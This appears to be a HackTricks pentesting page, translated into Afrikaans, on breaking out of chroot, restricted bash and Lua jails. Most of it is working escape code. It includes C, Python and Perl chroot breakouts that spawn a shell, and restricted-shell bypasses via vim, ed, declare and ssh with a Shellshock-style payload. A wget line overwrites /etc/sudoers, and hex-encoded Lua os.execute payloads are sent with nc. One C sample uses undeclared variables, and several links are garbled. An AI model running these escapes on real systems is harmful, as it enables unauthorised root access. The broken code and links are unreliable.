# Ontsnapping uit Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Soek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of jy enige binêre met "Shell" eienskap kan uitvoer**

## Chroot Ontsnappings

Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Die chroot-meganisme is **nie bedoel om te verdedig** teen opsetlike inmenging deur **bevoegde** (**root**) **gebruikers** nie. Op die meeste stelsels stapel chroot-kontekste nie behoorlik nie en chrooted programme **met voldoende bevoegdhede kan 'n tweede chroot uitvoer om uit te breek**.\
Gewoonlik beteken dit dat jy root moet wees binne die chroot om te ontsnap.

> [!TIP]
> Die **instrument** [**chw00t**](https://github.com/earthquake/chw00t) is geskep om die volgende scenario's te misbruik en uit `chroot` te ontsnap.

### Root + CWD

> [!WARNING]
> As jy **root** binne 'n chroot is, kan jy **ontsnap** deur **nog 'n chroot** te skep. Dit is omdat 2 chroots nie saam kan bestaan nie (in Linux), so as jy 'n gids skep en dan **'n nuwe chroot** op daardie nuwe gids skep terwyl jy **buitentoe is**, sal jy nou **buite die nuwe chroot** wees en dus in die FS wees.
>
> Dit gebeur omdat chroot gewoonlik NIE jou werksgids na die aangeduide een beweeg nie, so jy kan 'n chroot skep maar buite daarvan wees.

Gewoonlik sal jy nie die `chroot` binêre binne 'n chroot-jail vind nie, maar jy **kan 'n binêre saamstel, oplaai en uitvoer**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gesteekte fd

> [!WARNING]
> Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n lêer beskrywer na die huidige gids** en dan **skep hy die chroot in 'n nuwe gids**. Laastens, aangesien hy **toegang** het tot daardie **FD** **buite** die chroot, het hy toegang daartoe en hy **ontsnap**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kan oor Unix Domain Sockets oorgedra word, so:
>
> - Skep 'n kind proses (fork)
> - Skep UDS sodat ouer en kind kan praat
> - Voer chroot uit in die kind proses in 'n ander gids
> - In ouer proc, skep 'n FD van 'n gids wat buite die nuwe kind proc chroot is
> - Gee daardie FD aan die kind proses deur die UDS
> - Kind proses chdir na daardie FD, en omdat dit buite sy chroot is, sal hy die tronk ontsnap

### Root + Mount

> [!WARNING]
>
> - Monteer die wortel toestel (/) in 'n gids binne die chroot
> - Chroot in daardie gids
>
> Dit is moontlik in Linux

### Root + /proc

> [!WARNING]
>
> - Monteer procfs in 'n gids binne die chroot (as dit nog nie is nie)
> - Soek 'n pid wat 'n ander root/cwd inskrywing het, soos: /proc/1/root
> - Chroot in daardie inskrywing

### Root(?) + Fork

> [!WARNING]
>
> - Skep 'n Fork (kind proc) en chroot in 'n ander gids dieper in die FS en CD daarop
> - Van die ouer proses, skuif die gids waar die kind proses is in 'n gids voor die chroot van die kinders
> - Hierdie kind proses sal homself buite die chroot vind

### ptrace

> [!WARNING]
>
> - 'n Rukkie gelede kon gebruikers hul eie prosesse van 'n proses van hulself debugeer... maar dit is nie meer standaard moontlik nie
> - Hoe dit ook al sy, as dit moontlik is, kan jy ptrace in 'n proses en 'n shellcode binne dit uitvoer ([sien hierdie voorbeeld](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Kry inligting oor die tronk:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Pas PATH aan

Kyk of jy die PATH omgewing veranderlike kan aanpas
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Gebruik van vim
```bash
:set shell=/bin/sh
:shell
```
### Skep skrip

Kyk of jy 'n uitvoerbare lêer kan skep met _/bin/bash_ as inhoud
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Kry bash van SSH

As jy via ssh toegang verkry, kan jy hierdie truuk gebruik om 'n bash-skal te voer:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Verklaar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Jy kan byvoorbeeld die sudoers-lêer oorskryf.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ander truuks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**Dit kan ook interessant wees om die bladsy te kyk:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Truuks oor om uit python jails te ontsnap in die volgende bladsy:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In hierdie bladsy kan jy die globale funksies vind waartoe jy toegang het binne lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval met opdrag uitvoering:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Sommige truuks om **funksies van 'n biblioteek te bel sonder om punte te gebruik**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Lys die funksies van 'n biblioteek:
```bash
for k,v in pairs(string) do print(k,v) end
```
Let daarop dat elke keer wanneer jy die vorige een-liner in 'n **verskillende lua omgewing uitvoer, die volgorde van die funksies verander**. Daarom, as jy 'n spesifieke funksie moet uitvoer, kan jy 'n brute force aanval uitvoer deur verskillende lua omgewings te laai en die eerste funksie van die biblioteek aan te roep:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Kry interaktiewe lua-skaal**: As jy binne 'n beperkte lua-skaal is, kan jy 'n nuwe lua-skaal (en hopelik onbeperk) kry deur te bel:
```bash
debug.debug()
```
## Verwysings

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Skyfies: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
